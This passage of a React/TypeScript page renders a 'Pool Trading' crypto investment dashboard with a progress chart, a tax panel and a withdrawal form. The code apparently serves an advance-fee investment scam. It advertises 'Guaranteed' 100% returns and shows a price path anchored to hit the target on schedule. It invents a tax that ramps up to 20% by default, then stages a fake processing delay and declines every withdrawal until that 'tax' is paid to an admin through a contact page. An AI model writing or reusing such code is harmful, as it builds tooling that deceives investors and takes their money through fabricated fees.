  const durationHours = Math.round(plan.durationSec / 3600);
  const baseTaxRate =
    typeof manualOverride?.taxRate === "number"
      ? manualOverride.taxRate
      : typeof taxSummary?.tax_rate === "number"
      ? taxSummary.tax_rate
      : 0.2 * baseProgress01; // ramps up to 20% by plan end
  const baseTaxPaid =
    typeof manualOverride?.taxPaid === "number"
      ? Number(manualOverride.taxPaid)
      : typeof taxSummary?.tax_paid === "number"
      ? Number(taxSummary.tax_paid)
      : taxPayments
          .filter((p) => String(p.asset || "").toUpperCase() === plan.unit)
          .reduce((s, p) => s + Number(p.amount || 0), 0);
  const baseTaxDue =
    typeof manualOverride?.taxDue === "number"
      ? Number(manualOverride.taxDue)
      : typeof taxSummary?.tax_due === "number"
      ? Number(taxSummary.tax_due)
      : effectiveCurrent * baseTaxRate; // tax is handled separately from holdings and must be settled before withdrawal.
  const taxRemaining =
    typeof manualOverride?.taxRemaining === "number"
      ? Number(manualOverride.taxRemaining)
      : typeof taxSummary?.tax_remaining === "number"
      ? Number(taxSummary.tax_remaining)
      : Math.max(0, baseTaxDue - baseTaxPaid);
  const hasLockedWithdrawalForPlan = withdrawnLocked > 0.00000001;
  const shouldResetDashboard = hasLockedWithdrawalForPlan && taxRemaining <= 0.00000001 && effectiveCurrent <= 0.00000001;
  const progress01 = shouldResetDashboard ? 0 : baseProgress01;
  const progressPct = shouldResetDashboard ? 0 : baseProgressPct;
  const taxRate = shouldResetDashboard ? 0 : baseTaxRate;
  const taxDue = shouldResetDashboard ? 0 : baseTaxDue;
  const taxPaid = shouldResetDashboard ? 0 : baseTaxPaid;
  const taxRateLabel = `${(taxRate * 100).toFixed(2)}%`;
  const taxDueLabel = isBtcUnit ? fmtBtc(taxDue) : fmtMoney(taxDue, displayUnit as "USD" | "GBP");
  const taxPaidLabel = isBtcUnit ? fmtBtc(taxPaid) : fmtMoney(taxPaid, displayUnit as "USD" | "GBP");
  const taxRemainingLabel = isBtcUnit ? fmtBtc(taxRemaining) : fmtMoney(taxRemaining, displayUnit as "USD" | "GBP");
  const approvedDepositsForPlan = deposits
    .filter((d) => String(d.status || "").toLowerCase() === "confirmed")
    .filter((d) => String(d.asset || "").toUpperCase() === String(plan.unit || "").toUpperCase())
    .reduce((sum, d) => sum + Number(d.amount || 0), 0);
  const initialHoldingsValue = manualOverride ? Number(manualOverride.initialHoldings || 0) : (approvedDepositsForPlan > 0 ? approvedDepositsForPlan : plan.startValue);
  const initialHoldingsLabel = isBtcUnit ? fmtBtc(initialHoldingsValue) : fmtMoney(initialHoldingsValue, displayUnit as "USD" | "GBP");

  const nextEtaLabel = nextMilestone ? fmtEta(nextMilestone.tSec * 1000) : "Completed";
  const nextPctLabel = nextMilestone ? `${Math.round(nextMilestone.pct * 100)}%` : "100%";
  const pacePct = pace ? clamp((pace.ratio + 0.2) / 1.8, 0, 1) : 0.5;
  const maxWithdraw = taxRemaining <= 0.00000001 ? displayedCurrent : 0;
  const canOpenWithdrawPanel = reachedTarget;
  const userFirstName =
    (typeof user.first_name === "string" && user.first_name.trim()) ||
    (typeof user.email === "string" && user.email.includes("@") ? user.email.split("@")[0] : "User");
  const lockedWithdrawalAmount = taxRemaining > 0.00000001 ? effectiveCurrent : maxWithdraw;
  const lockedWithdrawalAmountStr =
    plan.unit === "USD"
      ? Number(lockedWithdrawalAmount).toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 })
      : Number(lockedWithdrawalAmount).toLocaleString(undefined, { maximumFractionDigits: 6 });
  const lockedWithdrawalAmountLabel = isBtcUnit ? `${lockedWithdrawalAmountStr} BTC` : fmtMoney(Number(lockedWithdrawalAmount), displayUnit as "USD" | "GBP");

  const compatSvg = (() => {
    if (!compatChart) return null;
    const w = 1200;
    const h = 220;
    const pad = 10;
    const series = [...compatChart.values, ...compatChart.target].filter((v) => Number.isFinite(v));
    if (!series.length) return null;
    let min = Math.min(...series);
    let max = Math.max(...series);
    if (min === max) {
      min -= 1;
      max += 1;
    }
    const yPad = (max - min) * 0.12;
    min -= yPad;
    max += yPad;

    const yAt = (v: number) => {
      const r = (v - min) / Math.max(1e-9, max - min);
      return pad + (1 - clamp(r, 0, 1)) * (h - pad * 2);
    };
    const xAt = (i: number, len: number) => pad + (i / Math.max(1, len - 1)) * (w - pad * 2);
    const toPath = (arr: number[]) =>
      arr
        .map((v, i) => `${i === 0 ? "M" : "L"} ${xAt(i, arr.length).toFixed(2)} ${yAt(v).toFixed(2)}`)
        .join(" ");
    return {
      w,
      h,
      livePath: toPath(compatChart.values),
      targetPath: toPath(compatChart.target),
      lastY: yAt(compatChart.values[compatChart.values.length - 1])
    };
  })();

  async function submitWithdrawal(e: React.FormEvent) {
    e.preventDefault();
    if (!plan) return;
    if (!reachedTarget) {
      setWdMsg({ tone: "err", text: "Withdrawal unlocks only after 100% progress." });
      return;
    }
    const amt = lockedWithdrawalAmount;
    if (!Number.isFinite(amt) || amt <= 0) {
      setWdMsg({ tone: "err", text: "No withdrawable balance available." });
      return;
    }
    if (!wdDestination.trim()) {
      setWdMsg({ tone: "err", text: "Enter your payout destination." });
      return;
    }
    if (wdMethod === "Crypto Wallet" && !validateAddressByChain(wdChain, wdDestination)) {
      setWdMsg({ tone: "err", text: `Enter a valid ${wdChain} wallet address.` });
      return;
    }

    setWdBusy(true);
    setWdPendingAmount(amt);
    setWdMsg(null);
    try {
      if (taxRemaining > 0.00000001) {
        await new Promise((resolve) => window.setTimeout(resolve, 3200));
        setTaxPopup(
          `${userFirstName}, withdrawal declined. Sort tax first (${taxRemainingLabel} remaining). Contact admin on the Contact page for payment details.`
        );
        return;
      }
      const res = await fetch(apiUrl("/api/withdrawals"), {
        method: "POST",
        credentials: "include",
        headers: { "Content-Type": "application/json", Accept: "application/json" },
        body: JSON.stringify({
          amount: amt,
          asset: plan.unit,
          method: wdMethod,
          chain: wdMethod === "Crypto Wallet" ? wdChain : null,
          destination: wdDestination.trim(),
          note: wdNote.trim() || null
        })
      });
      const j = await res.json().catch(() => ({}));
      if (!res.ok) throw new Error(j?.error || `HTTP ${res.status}`);

      setWdMsg({ tone: "ok", text: "Withdrawal request submitted successfully. Please wait for admin approval." });
      setWithdrawSuccessPopup(
        `${userFirstName}, congratulations. Your withdrawal request was submitted successfully. Please wait for admin approval.`
      );
      setWdNote("");
      setWdDestination("");
      const created = j?.request as WithdrawalItem | undefined;
      if (created?.id) {
        setWithdrawals((prev) => [created, ...prev].slice(0, 20));
      }
      setWithdrawOpen(false);
      void loadLedger();
    } catch (e: any) {
      const msg = typeof e?.message === "string" && e.message ? e.message : "Unable to submit right now. Please try again.";
      setWdMsg({ tone: "err", text: msg });
    } finally {
      setWdBusy(false);
      setWdPendingAmount(0);
    }
  }

  return (
    <>
      <section className="pageHero">
        <div>
          <div className="eyebrow">Progress</div>
          <h1 className="pageTitle">Pool Trading</h1>
          <p className="pageLead">Guaranteed to hit your target on time with 100% Returns.</p>
        </div>
        <div className="pageHeroActions">
          <a className="chip" href="#portfolio">Back</a>
        </div>
      </section>

      <section className="marketGrid" aria-label="Progress Pool Trading">
        <div className="marketCard spanFull progressTargetCard">
          <div className="marketCardHead">
            <div>
              <div className="panelTitle">Target Path</div>
              <div className="panelSub">
                Plan: <span className="mono">{durationHours}h</span>  |  Start: <span className="mono">{startLabel}</span>  |  Target:{" "}
                <span className="mono">{targetLabel}</span>
              </div>
            </div>
            <div className="progressBadge">
              <div className="progressBadgeTop">{simMeta.done ? "COMPLETED" : "TIME LEFT"}</div>
              <div className="mono">{timeLeftLabel}</div>
            </div>
          </div>
          <div className="progressBody">
            <div className="progressKpis">
              <div className="kpi">
                <div className="kpiLabel">Current</div>
                <div className="kpiValue mono">{currentLabel}</div>
              </div>
              <div className="kpi">
                <div className="kpiLabel">Progress</div>
                <div className="kpiValue mono">{progressPct}%</div>
              </div>
              <div className="kpi tax">
                <div className="kpiLabel">Tax Rate</div>
                <div className="kpiValue mono">{taxRateLabel}</div>
              </div>
              <div className="kpi tax">
                <div className="kpiLabel">Est. Tax</div>
                <div className="kpiValue mono">{taxDueLabel}</div>
              </div>
              <div className="kpi tax">
                <div className="kpiLabel">Tax Paid</div>
                <div className="kpiValue mono">{taxPaidLabel}</div>
              </div>
              <div className="kpi tax">
                <div className="kpiLabel">Tax Remaining</div>
                <div className="kpiValue mono">{taxRemainingLabel}</div>
              </div>
              <div className="kpi">
                <div className="kpiLabel">Initial Holdings</div>
                <div className="kpiValue mono">{initialHoldingsLabel}</div>
              </div>
              <div className="kpi">
                <div className="kpiLabel">Window</div>
                <div className="kpiValue mono">
                  {startShort} {"->"} {endShort}
                </div>
              </div>
            </div>

            <div className="progressBar" aria-label="Trade setup progress">
              <div className="progressBarFill" style={{ width: `${progressPct}%` }} />
            </div>

            <div className="progressMeta">
              <div className="muted">Start: <span className="mono">{startTime.toLocaleString()}</span></div>
              <div className="muted">End: <span className="mono">{endTime.toLocaleString()}</span></div>
            </div>
          </div>
        </div>

        <div className="marketCard spanFull progressChartCard">
          <div className="marketCardHead">
            <div>
              <div className="panelTitle">Time vs Target</div>
              <div className="panelSub">Actual (live) vs Target (dashed). Anchored to hit the exact destination on time.</div>
            </div>
            <div className="muted mono">live | {new Date().toLocaleTimeString()}</div>
          </div>
          <div className="authBody">
            {compatSvg ? (
              <div style={{ marginBottom: 12, border: "1px solid rgba(231,238,252,0.12)", borderRadius: 12, overflow: "hidden" }}>
                <svg viewBox={`0 0 ${compatSvg.w} ${compatSvg.h}`} width="100%" height="220" role="img" aria-label="Progress compatibility chart">
                  <rect x="0" y="0" width={compatSvg.w} height={compatSvg.h} fill="#131722" />
                  <path d={compatSvg.targetPath} fill="none" stroke="rgba(231,238,252,0.45)" strokeWidth="2" strokeDasharray="6 6" />
                  <path d={compatSvg.livePath} fill="none" stroke="rgba(90,210,255,0.95)" strokeWidth="2.4" />
                  <line x1="0" x2={compatSvg.w} y1={compatSvg.lastY} y2={compatSvg.lastY} stroke="rgba(90,210,255,0.18)" strokeDasharray="4 6" />
                </svg>
              </div>
            ) : null}
            <div style={{ display: "flex", gap: 8, marginBottom: 12, flexWrap: "wrap" }}>
              <button type="button" className="mini progressToggleBtn" onClick={() => setShowAdvancedChart((v) => !v)}>
                {showAdvancedChart ? "Hide advanced chart" : "Show advanced chart"}
              </button>
              <span className="muted mono">Reliable mode is enabled by default for cross-device stability.</span>
            </div>
            {toast ? (
              <div style={{ marginBottom: 12 }}>
                <Notice tone="info" title={toast.title}>{toast.body}</Notice>
              </div>
            ) : null}
            {usingCachedSession ? (
              <div style={{ marginBottom: 12 }}>
                <Notice tone="info" title="Session sync in progress">Using local session cache while account sync completes.</Notice>
              </div>
            ) : null}
            {showAdvancedChart && progressProvider ? (
              <TradingChart
                symbol={isBtcUnit ? "POOL-BTC" : displayUnit === "GBP" ? "POOL-GBP" : "POOL-USD"}
                dataProvider={tvDataProvider}
                overlaysBuilder={overlaysBuilder || undefined}
                markers={markers}
                heightPx={860}
              />
            ) : showAdvancedChart ? (
              <div className="authError">Pool trading not ready.</div>
            ) : null}
            <div className="progressWithdrawRow">
              <button
                type="button"
                className={`btnContact btnHero withdrawBtn ${canOpenWithdrawPanel ? "isReady" : "isDisabled"}`}
                disabled={!canOpenWithdrawPanel}
                aria-disabled={!canOpenWithdrawPanel}
                onClick={() => {
                  if (!reachedTarget) return;
                  setWithdrawOpen(true);
                  setWdMsg(null);
                }}
              >
                {reachedTarget ? "Withdraw Now" : "Withdrawal Locked"}
              </button>
              <div className="progressWithdrawHint muted">
                {reachedTarget
                  ? taxRemaining > 0.00000001
                    ? `Tax payment required first (${taxRemainingLabel} remaining).`
                    : "Progress complete. Continue to withdrawal support."
                  : "Withdrawal unlocks automatically at 100% progress."}
              </div>
            </div>
          </div>
        </div>

        <div className="marketCard">
          <div className="marketCardHead">
            <div>
              <div className="panelTitle">Milestones</div>
              <div className="panelSub">Checkpoints, ETA, and alerts</div>
            </div>
            <div className="muted mono">Next: {nextPctLabel}</div>
          </div>
          <div className="authBody">
            <div className="progressMiniGrid">
              <div className="miniBox">
                <div className="miniLabel">Next Milestone ETA</div>
                <div className="miniValue mono">{nextEtaLabel}</div>
                <div className="miniHint muted">Based on your anchored path</div>
              </div>
              <div className="miniBox">
                <div className="miniLabel">Pace (1h)</div>
                <div className="miniValue mono">
                  {pace ? `${pace.actPerHr >= 0 ? "+" : ""}${pace.actPerHr.toLocaleString(undefined, { maximumFractionDigits: 2 })}` : "--"}
                  {isBtcUnit ? " BTC/hr" : " /hr"}
                </div>
                <div className={`miniHint ${pace?.ui || "muted"} mono`}>
                  {pace ? `Required: ${pace.reqPerHr.toLocaleString(undefined, { maximumFractionDigits: 2 })}${isBtcUnit ? " BTC/hr" : " /hr"}` : "—"}
                </div>
              </div>
            </div>

            <div className="paceGauge" aria-label="Time-to-target indicator">
              <div className="paceGaugeFill" style={{ width: `${Math.round(pacePct * 100)}%` }} />
            </div>
            <div className="paceLegend">
              <span className="muted">Behind</span>
              <span className="muted">On pace</span>
              <span className="muted">Ahead</span>
            </div>

            <div className="mileList" aria-label="Milestone list">
              {milestones.map((m) => {
                const done = simMeta.current >= m.value;
                const key = String(Math.round(m.pct * 100));
                return (
                  <div className="mileRow" key={key}>
                    <div className={`mileDot ${done ? "done" : ""}`} aria-hidden="true" />
                    <div className="mileMain">
                      <div className="mileTop">
                        <div className="mileName mono">{key}%</div>
                        <div className="mileVal mono">{isBtcUnit ? fmtBtc(m.value) : fmtMoney(m.value, displayUnit as "USD" | "GBP")}</div>
                      </div>
                      <div className="mileSub muted">{fmtEta(m.tSec * 1000)}</div>
                    </div>
                    <label className="mileToggle" title="Toggle alert">
                      <input
                        type="checkbox"
                        checked={!!alertCfg.enabled[key]}
                        onChange={(e) => setAlertCfg((s) => ({ ...s, enabled: { ...s.enabled, [key]: e.target.checked } }))}
                      />
                      <span className="muted">Alert</span>
                    </label>
                  </div>
                );
              })}
            </div>
          </div>
        </div>

        <div className="marketCard">
          <div className="marketCardHead">
            <div>
              <div className="panelTitle">Risk</div>
              <div className="panelSub">Drawdown and volatility</div>
            </div>
            <div className="muted mono">Live</div>
          </div>
          <div className="authBody">
            <div className="riskGrid">
              <div className="riskBox">
                <div className="miniLabel">Max Drawdown</div>
                <div className="miniValue mono">{risk ? `${risk.maxDdPct.toFixed(2)}%` : "--"}</div>
                <div className="miniHint muted">Peak-to-trough (to now)</div>
              </div>
              <div className="riskBox">
                <div className="miniLabel">Current Drawdown</div>
                <div className="miniValue mono">{risk ? `${risk.curDdPct.toFixed(2)}%` : "--"}</div>
                <div className="miniHint muted">From local peak</div>
              </div>
              <div className="riskBox">
                <div className="miniLabel">Volatility (1h)</div>
                <div className="miniValue mono">{risk ? `${risk.vol1hPct.toFixed(2)}%` : "--"}</div>
                <div className="miniHint muted">Recent path intensity</div>
              </div>
            </div>

            <div className="pairsNote">
              <b> These risk stats are computed from public markets and update as the path evolves. </b>
            </div>
          </div>
        </div>

        <div className="marketCard spanFull">
          <div className="marketCardHead">
            <div>
              <div className="panelTitle">Event Timeline</div>
              <div className="panelSub">Session-style notes generated from the price path</div>
            </div>
            <div className="muted mono">{events.length} events</div>
          </div>
          <div className="authBody">
            <div className="timeline">
              {events.map((e) => {
                const done = simMeta.nowSec >= e.tSec;
                return (
                  <div className={`tRow ${done ? "done" : ""}`} key={e.id}>
                    <div className="tDot" aria-hidden="true" />
                    <div className="tMain">
                      <div className="tTop">
                        <div className="tTag">{e.tag}</div>
                        <div className="tTime mono">{fmtEta(e.tSec * 1000)}</div>
                      </div>
                      <div className="tTitle">{e.title}</div>
                      <div className="tBody muted">{e.body}</div>
                    </div>
                  </div>
                );
              })}
            </div>
          </div>
        </div>

        <div className="marketCard spanFull">
          <div className="marketCardHead">
            <div>
              <div className="panelTitle">Holdings</div>
              <div className="panelSub">Details are hidden on this website</div>
            </div>
            <div className="muted mono">
              Positions: <span className="mono">{holdingsSummary.positions}</span>
            </div>
          </div>
          <div className="authBody">
            <div className="pairsNote">
              <b> Holdings are stored privately and are not shown on-screen. Your account is tracked internally by email/user id. </b>
            </div>
            <div className="pairsNote">
              Positions: <span className="mono">{holdingsSummary.positions}</span>  |  Privacy: <span className="mono">{holdingsSummary.label}</span>
            </div>
          </div>
        </div>
      </section>

      {withdrawOpen ? (
        <div
          className="withdrawModalOverlay"
          role="presentation"
          onClick={(e) => {
            if (e.target === e.currentTarget) setWithdrawOpen(false);
          }}
        >
          <section className="withdrawModal" role="dialog" aria-modal="true" aria-label="Withdrawal request form">
            <div className="withdrawHead">
              <div>
                <div className="panelTitle">Withdrawal Request</div>
                <div className="panelSub">
                  Holdings: <span className="mono">{isBtcUnit ? fmtBtc(effectiveCurrent) : fmtMoney(effectiveCurrent, displayUnit as "USD" | "GBP")}</span>  |  Available:{" "}
                  <span className="mono">{isBtcUnit ? fmtBtc(maxWithdraw) : fmtMoney(maxWithdraw, displayUnit as "USD" | "GBP")}</span>
                </div>
              </div>
              <button type="button" className="iconBtn" aria-label="Close withdrawal form" onClick={() => setWithdrawOpen(false)}>
                <i className="fa-solid fa-xmark" aria-hidden="true" />
              </button>
            </div>

            <div className="pairsNote">
              <b>Tax is exclusive of holdings and must be paid before withdrawal.</b>
              <span className="mono"> Due: {taxDueLabel} | Paid: {taxPaidLabel} | Remaining: {taxRemainingLabel}</span>
              {taxRemaining > 0.00000001 ? (
                <span>
                  {" "}
                  For tax payment details, contact admin on the <a href="#contact">Contact page</a>.
                </span>
              ) : null}
            </div>

            <form className="withdrawForm" onSubmit={submitWithdrawal}>
              <label className="authField">
                <span className="muted">Amount to be withdrawn ({plan.unit})</span>
                <input
                  className="withdrawAmountInput mono"
                  value={lockedWithdrawalAmountStr}
                  readOnly
                  disabled={wdBusy}
                />
                <div className="withdrawAmountHighlight mono">{lockedWithdrawalAmountLabel}</div>
              </label>

              <label className="authField">
                <span className="muted">Method</span>
                <select value={wdMethod} onChange={(e) => setWdMethod(e.target.value as any)} disabled={wdBusy}>
                  <option>Bank Transfer</option>
                  <option>Crypto Wallet</option>
                </select>
              </label>

              {wdMethod === "Crypto Wallet" ? (
                <label className="authField">
                  <span className="muted">Blockchain</span>
                  <select value={wdChain} onChange={(e) => setWdChain(e.target.value as any)} disabled={wdBusy}>
                    <option value="BTC">Bitcoin (BTC)</option>
                    <option value="ERC20">Ethereum (ERC20)</option>
                    <option value="TRC20">Tron (TRC20)</option>
                    <option value="BEP20">BNB Smart Chain (BEP20)</option>
                    <option value="SOL">Solana (SOL)</option>
                  </select>
                </label>
              ) : null}

              <label className="authField">
                <span className="muted">{wdMethod === "Bank Transfer" ? "Bank details" : "Wallet address"}</span>
                <input
                  placeholder={
                    wdMethod === "Bank Transfer"
                      ? "Account name / IBAN / Routing"
                      : wdChain === "BTC"
                        ? "e.g. bc1q..."
                        : wdChain === "TRC20"
                          ? "e.g. TXYz..."
                          : wdChain === "SOL"
                            ? "e.g. 7v1P... (base58)"
                            : "e.g. 0x... (42 chars)"
                  }
                  value={wdDestination}
                  onChange={(e) => setWdDestination(e.target.value)}
                  disabled={wdBusy}
                />
              </label>

              <label className="authField">
                <span className="muted">Note (optional)</span>
                <input
                  placeholder="Any payout instruction"
                  value={wdNote}
                  onChange={(e) => setWdNote(e.target.value)}
                  disabled={wdBusy}
                />
              </label>

              {wdMsg ? (
                <Notice tone={wdMsg.tone === "ok" ? "info" : "warn"} title={wdMsg.tone === "ok" ? "Submitted" : "Check form"}>
                  {wdMsg.text}
                </Notice>
              ) : null}

              <div className="withdrawActions">
                <button type="button" className="ghost" onClick={() => setWithdrawOpen(false)} disabled={wdBusy}>
                  Cancel
                </button>
                <button type="submit" className="primary" disabled={wdBusy}>
                  {wdBusy ? <><i className="fa-solid fa-spinner fa-spin" aria-hidden="true" /> Processing...</> : "Submit Request"}
                </button>
              </div>
            </form>

            {withdrawals.length ? (
              <div className="mileList" aria-label="Recent withdrawals">
                {withdrawals.slice(0, 3).map((w) => (
                  <div className="mileRow" key={w.id}>
                    <div className={`mileDot ${String(w.status).toLowerCase() === "completed" ? "done" : ""}`} aria-hidden="true" />
                    <div className="mileMain">
                      <div className="mileTop">
                        <div className="mileName mono">{String(w.asset || "").toUpperCase() === "BTC" ? fmtBtc(w.amount) : fmtMoney(w.amount, String(w.asset || "").toUpperCase() === "GBP" ? "GBP" : "USD")}</div>
                        <div className="mileVal mono">{w.chain ? `${w.status} (${w.chain})` : w.status}</div>
                      </div>
                      <div className="mileSub muted">
                        {new Date(w.created_at).toLocaleString()}
                        {typeof w.balance_after === "number"
                          ? ` | Balance after: ${String(w.asset || "").toUpperCase() === "BTC" ? fmtBtc(w.balance_after) : fmtMoney(w.balance_after, String(w.asset || "").toUpperCase() === "GBP" ? "GBP" : "USD")}`
                          : ""}
                      </div>
                    </div>
                  </div>
                ))}
              </div>
            ) : null}

            {wdBusy ? (
              <div className="withdrawProcessingOverlay" role="status" aria-live="polite" aria-label="Withdrawal processing">
                <div className="withdrawProcessingCard">
                  <div className="withdrawProcessingHead mono">{userFirstName}</div>
                  <div className="withdrawSpinner" aria-hidden="true" />
                  <div className="withdrawProcessingTitle">Processing withdrawal</div>
                  <div className="withdrawProcessingSub muted">Please wait while we verify your request...</div>
                </div>
              </div>
            ) : null}
          </section>
        </div>
      ) : null}

      {taxPopup ? (
        <div
          className="taxAlertOverlay"
          role="presentation"
          onClick={(e) => {
            if (e.target === e.currentTarget) setTaxPopup(null);
          }}
        >
          <section className="taxAlertCard" role="alertdialog" aria-modal="true" aria-label="Tax alert">
            <div className="taxAlertTitle">Withdrawal Alert</div>
            <div className="taxAlertBody">{taxPopup}</div>
            <div className="taxAlertActions">
              <button type="button" className="primary" onClick={() => setTaxPopup(null)}>
                OK
              </button>
            </div>
          </section>
        </div>
      ) : null}

      {withdrawSuccessPopup ? (
        <div
          className="taxAlertOverlay"
          role="presentation"
          onClick={(e) => {
            if (e.target === e.currentTarget) setWithdrawSuccessPopup(null);
          }}
        >
          <section className="taxAlertCard" role="alertdialog" aria-modal="true" aria-label="Withdrawal success">
            <div className="taxAlertTitle">Withdrawal Submitted</div>
            <div className="taxAlertBody">{withdrawSuccessPopup}</div>
            <div className="taxAlertActions">
              <button type="button" className="primary" onClick={() => setWithdrawSuccessPopup(null)}>
                OK
              </button>
            </div>
          </section>
        </div>
      ) : null}
    </>
  );
}



